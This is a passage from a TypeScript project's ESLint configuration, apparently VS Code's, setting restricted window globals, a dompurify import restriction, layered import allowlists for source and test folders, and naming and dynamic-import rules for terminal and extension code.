					'message': 'Use <targetWindow>.focus to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'blur',
					'message': 'Use <targetWindow>.blur to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'close',
					'message': 'Use <targetWindow>.close to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'dispatchEvent',
					'message': 'Use <targetWindow>.dispatchEvent to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'getSelection',
					'message': 'Use <targetWindow>.getSelection to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'matchMedia',
					'message': 'Use <targetWindow>.matchMedia to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'open',
					'message': 'Use <targetWindow>.open to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'parent',
					'message': 'Use <targetWindow>.parent to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'postMessage',
					'message': 'Use <targetWindow>.postMessage to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'devicePixelRatio',
					'message': 'Use <targetWindow>.devicePixelRatio to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'frames',
					'message': 'Use <targetWindow>.frames to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'frameElement',
					'message': 'Use <targetWindow>.frameElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'innerHeight',
					'message': 'Use <targetWindow>.innerHeight to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'innerWidth',
					'message': 'Use <targetWindow>.innerWidth to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'outerHeight',
					'message': 'Use <targetWindow>.outerHeight to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'outerWidth',
					'message': 'Use <targetWindow>.outerWidth to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'opener',
					'message': 'Use <targetWindow>.opener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'origin',
					'message': 'Use <targetWindow>.origin to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screen',
					'message': 'Use <targetWindow>.screen to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenLeft',
					'message': 'Use <targetWindow>.screenLeft to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenTop',
					'message': 'Use <targetWindow>.screenTop to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenX',
					'message': 'Use <targetWindow>.screenX to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenY',
					'message': 'Use <targetWindow>.screenY to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'scrollX',
					'message': 'Use <targetWindow>.scrollX to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'scrollY',
					'message': 'Use <targetWindow>.scrollY to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'top',
					'message': 'Use <targetWindow>.top to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'visualViewport',
					'message': 'Use <targetWindow>.visualViewport to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				}
			]
		}
	},
	// electron-utility layer
	{
		files: [
			'src/**/electron-utility/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'no-restricted-imports': [
				'warn',
				{
					'paths': [
						{
							'name': 'electron',
							'allowImportNames': [
								'net',
								'system-preferences',
							],
							'message': 'Only net and system-preferences are allowed to be imported from electron'
						}
					]
				}
			]
		}
	},
	{
		files: [
			'src/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['dompurify*'],
							'message': 'Use domSanitize instead of dompurify directly'
						},
					]
				}
			],
			'local/code-import-patterns': [
				'warn',
				{
					// imports that are allowed in all files of layers:
					// - browser
					// - electron-browser
					'when': 'hasBrowser',
					'allow': []
				},
				{
					// imports that are allowed in all files of layers:
					// - node
					// - electron-utility
					// - electron-main
					'when': 'hasNode',
					'allow': [
						'@github/copilot-sdk',
						'zod',
						'@microsoft/dev-tunnels-contracts',
						'@microsoft/dev-tunnels-management',
						'@parcel/watcher',
						'@vscode/sqlite3',
						'@vscode/vscode-languagedetection',
						'@vscode/ripgrep-universal',
						'@vscode/iconv-lite-umd',
						'@vscode/native-watchdog',
						'@vscode/policy-watcher',
						'@vscode/proxy-agent',
						'@vscode/spdlog',
						'@vscode/windows-process-tree',
						'assert',
						'child_process',
						'console',
						'cookie',
						'crypto',
						'detect-libc',
						'dns',
						'events',
						'fs',
						'fs/promises',
						'http',
						'https',
						'inspector',
						'minimist',
						'node:module',
						'node:url',
						'node:v8',
						'native-keymap',
						'net',
						'node-pty',
						'os',
						// 'path', NOT allowed: use src/vs/base/common/path.ts instead
						'perf_hooks',
						'readline',
						'ssh2',
						'stream',
						'string_decoder',
						'tar',
						'tas-client',
						'tls',
						'undici',
						'undici-types',
						'url',
						'module',
						'util',
						'vscode-regexpp',
						'vscode-textmate',
						'worker_threads',
						'ws',
						'@xterm/addon-clipboard',
						'@xterm/addon-image',
						'@xterm/addon-ligatures',
						'@xterm/addon-search',
						'@xterm/addon-serialize',
						'@xterm/addon-unicode11',
						'@xterm/addon-webgl',
						'@xterm/headless',
						'@xterm/xterm',
						'yauzl',
						'yazl',
						'zlib',
						'chrome-remote-interface'
					]
				},
				{
					// imports that are allowed in all files of layers:
					// - electron-utility
					// - electron-main
					'when': 'hasElectron',
					'allow': [
						'electron'
					]
				},
				{
					// imports that are allowed in all /test/ files
					'when': 'test',
					'allow': [
						'assert',
						'sinon',
						'sinon-test'
					]
				},
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				// !!! Do not relax these rules !!!
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				//
				// A path ending in /~ has a special meaning. It indicates a template position
				// which will be substituted with one or more layers.
				//
				// When /~ is used in the target, the rule will be expanded to 14 distinct rules.
				// e.g. 'src/vs/base/~' will be expanded to:
				//  - src/vs/base/common
				//  - src/vs/base/worker
				//  - src/vs/base/browser
				//  - src/vs/base/electron-browser
				//  - src/vs/base/node
				//  - src/vs/base/electron-main
				//  - src/vs/base/test/common
				//  - src/vs/base/test/worker
				//  - src/vs/base/test/browser
				//  - src/vs/base/test/electron-browser
				//  - src/vs/base/test/node
				//  - src/vs/base/test/electron-main
				//
				// When /~ is used in the restrictions, it will be replaced with the correct
				// layers that can be used e.g. 'src/vs/base/electron-browser' will be able
				// to import '{common,browser,electron-sanbox}', etc.
				//
				// It is possible to use /~ in the restrictions property even without using it in
				// the target property by adding a layer property.
				{
					'target': 'src/vs/base/~',
					'restrictions': [
						'vs/base/~'
					]
				},
				{
					'target': 'src/vs/base/parts/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~'
					]
				},
				{
					'target': 'src/vs/platform/agentHost/node/diffWorkerMain.ts',
					'layer': 'node',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/common/diff/**', // diffing logic used by the agent host
					]
				},
				{
					'target': 'src/vs/platform/agentHost/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'tas-client', // node module allowed even in /common/
						'@microsoft/1ds-core-js', // node module allowed even in /common/
						'@microsoft/1ds-post-js', // node module allowed even in /common/
						'@xterm/headless', // node module allowed even in /common/
						'@vscode/fs-copyfile', // used by agentHost for file copying after worktree creation
						'@vscode/tree-sitter-wasm', // used by agentHost for command auto-approval
						'@vscode/copilot-api', // used by agentHost for Copilot API requests
						'@anthropic-ai/sdk', // used by agentHost for Anthropic API requests
						'@anthropic-ai/claude-agent-sdk', // used by agentHost for Claude Agent SDK session enumeration / queries
						'@modelcontextprotocol/sdk/**/*', // used by agentHost for Claude client-tool MCP result types (Phase 10)
						'@github/copilot-sdk',
						'zod', // used by agentHost for Claude client-tool MCP input schemas
						{ 'when': 'hasNode', 'pattern': 'libsodium-wrappers' },
						{
							'when': 'test',
							'pattern': 'events'
						},
						{
							'when': 'test',
							'pattern': 'module'
						},
						{
							'when': 'test',
							'pattern': 'websocket'
						}
					]
				},
				{
					'target': 'src/vs/platform/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'tas-client', // node module allowed even in /common/
						'@microsoft/1ds-core-js', // node module allowed even in /common/
						'@microsoft/1ds-post-js', // node module allowed even in /common/
						'@xterm/headless', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm' // used by agentHost for command auto-approval
					]
				},
				{
					'target': 'src/vs/editor/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'@vscode/tree-sitter-wasm', // node module allowed even in /common/
						'@vscode/diff' // type import (loaded at runtime via resolveAmdNodeModulePath)
					]
				},
				{
					'target': 'src/vs/editor/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/editor/standalone/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/standalone/~',
						'@vscode/tree-sitter-wasm' // type import
					]
				},
				{
					'target': 'src/vs/editor/editor.all.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/editor/editor.worker.start.ts',
					'layer': 'worker',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~'
					]
				},
				{
					'target': 'src/vs/editor/{editor.api.ts,editor.main.ts}',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/standalone/~',
						'vs/editor/*'
					]
				},
				{
					'target': 'src/vs/workbench/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'assert',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						} // TODO@layers
					]
				},
				{
					'target': 'src/vs/workbench/api/~',
					'restrictions': [
						'vscode',
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/api/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/services/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						}, // TODO@layers
						'tas-client', // node module allowed even in /common/
						'vscode-textmate', // node module allowed even in /common/
						'@vscode/vscode-languagedetection', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						} // node module allowed even in /browser/
					]
				},
				{
					'target': 'src/vs/workbench/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/~',
						'vs/workbench/contrib/terminal/terminalContribChatExports*',
						'vs/workbench/contrib/terminal/terminalContribExports*',
						'vscode-notebook-renderer', // Type only import
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/addon-*'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': 'vscode-textmate'
						} // node module allowed even in /browser/
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminalContrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						// Only allow terminalContrib to import from itself, this works because
						// terminalContrib is one extra folder deep
						'vs/workbench/contrib/terminalContrib/*/~',
						'vscode-notebook-renderer', // Type only import
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/addon-*'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': 'vscode-textmate'
						}, // node module allowed even in /browser/
						'@xterm/headless' // node module allowed even in /common/ and /browser/
					]
				},
				{
					'target': 'src/vs/code/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/code/~',
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/workbench.web.main.js'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/workbench.web.main.internal.js'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/~'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/services/*/~'
						}
					]
				},
				{
					'target': 'src/vs/sessions/electron-browser/sessions.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/sessions.desktop.main.js'
					]
				},
				{
					'target': 'src/vs/server/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/server/~'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminal.all.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/workbench/contrib/**'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminalContribChatExports.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminalContribExports.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/platform/*/~',
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.common.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminal/terminal.all.js',
					]
				},
				{
					'target': 'src/vs/workbench/workbench.web.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.common.main.js'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.web.main.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.web.main.js'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.desktop.main.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/*/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.common.main.js'
					]
				},
				{
					'target': 'src/vs/amdX.ts',
					'restrictions': [
						'vs/base/common/*'
					]
				},
				{
					'target': 'src/vs/{monaco.d.ts,nls.ts}',
					'restrictions': []
				},
				{
					'target': 'src/vscode-dts/**',
					'restrictions': []
				},
				{
					'target': 'src/vs/nls.ts',
					'restrictions': [
						'vs/*'
					]
				},
				{
					'target': 'src/{bootstrap-cli.ts,bootstrap-esm.ts,bootstrap-fork.ts,bootstrap-import.ts,bootstrap-meta.ts,bootstrap-node.ts,bootstrap-server.ts,cli.ts,main.ts,mainImpl.ts,server-cli.ts,server-main.ts}',
					'restrictions': [
						'vs/**/common/*',
						'vs/**/node/*',
						'vs/nls.js',
						'src/*.js',
						'*' // node.js
					]
				},
				{
					'target': 'src/vs/sessions/sessions.common.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminal/terminal.all.js',
					]
				},
				{
					'target': 'src/vs/sessions/sessions.desktop.main.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/*/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.common.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/sessions.web.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.common.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/sessions.web.main.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.web.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/test/sessions.web.test.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/test/**',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.web.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/test/{web.test.ts,web.test.factory.ts}',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/test/**',
						'vs/sessions/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/sessions/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/sessions/~',
						'vs/sessions/services/*/~'
					]
				},
				{
					'target': 'src/vs/sessions/contrib/providers/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/sessions/services/*/~',
						'@microsoft/dev-tunnels-connections', // type-only browser bundle conformance check
						'@microsoft/dev-tunnels-management', // type-only browser bundle conformance check
					]
				},
				{
					'target': 'src/vs/sessions/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/services/*/~',
					]
				},
				{
					'target': 'src/vs/sessions/services/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/workbench/contrib/*/~',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						}, // TODO@layers
						'tas-client', // node module allowed even in /common/
						'vscode-textmate', // node module allowed even in /common/
						'@vscode/vscode-languagedetection', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						} // node module allowed even in /browser/
					]
				},
			]
		}
	},
	{
		files: [
			'test/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-import-patterns': [
				'warn',
				{
					'target': 'test/smoke/**',
					'restrictions': [
						'test/automation',
						'test/smoke/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/sanity/**',
					'restrictions': [
						'test/sanity/**',
						'*' // node modules
					]
				},
				{
					'target': 'test/automation/**',
					'restrictions': [
						'test/automation/**',
						'@vscode/*',
						'@parcel/*',
						'playwright-core/**',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/integration/**',
					'restrictions': [
						'test/integration/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/monaco/**',
					'restrictions': [
						'test/monaco/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/scenario/**',
					'restrictions': [
						'test/automation',
						'test/scenario/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/mcp/**',
					'restrictions': [
						'test/automation',
						'test/scenario',
						'test/mcp/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'@modelcontextprotocol/sdk/**/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/componentFixtures/playwright/**',
					'restrictions': [
						'test/componentFixtures/playwright/**',
						'@playwright/*',
						'*' // node modules
					]
				}
			]
		}
	},
	{
		files: ['src/vs/**/*.ts'],
		rules: {
			'local/code-no-legacy-notification-parsing': ['error', {
				allowedFiles: [
					'src/vs/workbench/api/browser/mainThreadMessageService.ts',
					'src/vs/workbench/api/browser/mainThreadProgress.ts',
					'src/vs/platform/notification/test/common/notificationMessage.test.ts',
					'src/vs/workbench/test/common/notifications.test.ts',
					'src/vs/workbench/test/browser/notificationsList.test.ts',
					'src/vs/workbench/services/progress/test/browser/progressService.test.ts',
				],
			}],
		},
	},
	{
		// `IAgentSessionsService` and the agent sessions model are provider-internal
		// to Copilot. Only the Copilot chat sessions provider may consume them; the
		// rest of the Agents window (sessions workbench) must stay provider-agnostic.
		// See src/vs/sessions/SESSIONS.md.
		files: [
			'src/vs/sessions/**/*.ts'
		],
		ignores: [
			'src/vs/sessions/contrib/providers/copilotChatSessions/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['dompurify*'],
							'message': 'Use domSanitize instead of dompurify directly'
						},
						{
							'group': ['**/agentSessions/agentSessionsService', '**/agentSessions/agentSessionsService.js'],
							'message': 'IAgentSessionsService is provider-internal to Copilot. Only contrib/providers/copilotChatSessions may import it; the rest of the Agents window must stay provider-agnostic. See src/vs/sessions/SESSIONS.md.'
						}
					]
				}
			]
		}
	},
	{
		files: [
			'src/vs/workbench/contrib/notebook/browser/view/renderers/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-runtime-import': [
				'error',
				{
					'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts': [
						'**/*'
					]
				}
			],
			'local/code-limited-top-functions': [
				'error',
				{
					'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts': [
						'webviewPreloads',
						'preloadsScriptStr'
					]
				}
			]
		}
	},
	// Terminal
	{
		files: [
			'src/vs/workbench/contrib/terminal/**/*.ts',
			'src/vs/workbench/contrib/terminalContrib/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'@typescript-eslint/naming-convention': [
				'warn',
				// variableLike
				{ 'selector': 'variable', 'format': ['camelCase', 'UPPER_CASE', 'PascalCase'] },
				{ 'selector': 'variable', 'filter': '^I.+Service$', 'format': ['PascalCase'], 'prefix': ['I'] },
				// memberLike
				{ 'selector': 'memberLike', 'modifiers': ['private'], 'format': ['camelCase'], 'leadingUnderscore': 'require' },
				{ 'selector': 'memberLike', 'modifiers': ['protected'], 'format': ['camelCase'], 'leadingUnderscore': 'require' },
				{ 'selector': 'enumMember', 'format': ['PascalCase'] },
				// memberLike - Allow enum-like objects to use UPPER_CASE
				{ 'selector': 'method', 'modifiers': ['public'], 'format': ['camelCase', 'UPPER_CASE'] },
				// typeLike
				{ 'selector': 'typeLike', 'format': ['PascalCase'] },
				{ 'selector': 'interface', 'format': ['PascalCase'] }
			],
			'comma-dangle': ['warn', 'only-multiline']
		}
	},
	// Ban dynamic require() and import() calls in extensions to ensure tree-shaking works
	{
		files: [
			'extensions/**/*.{ts,tsx}',
		],
		ignores: [
			'extensions/**/*.test.ts',
			'extensions/copilot/**/*',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `CallExpression[callee.name='require'][arguments.0.type!='Literal']`,
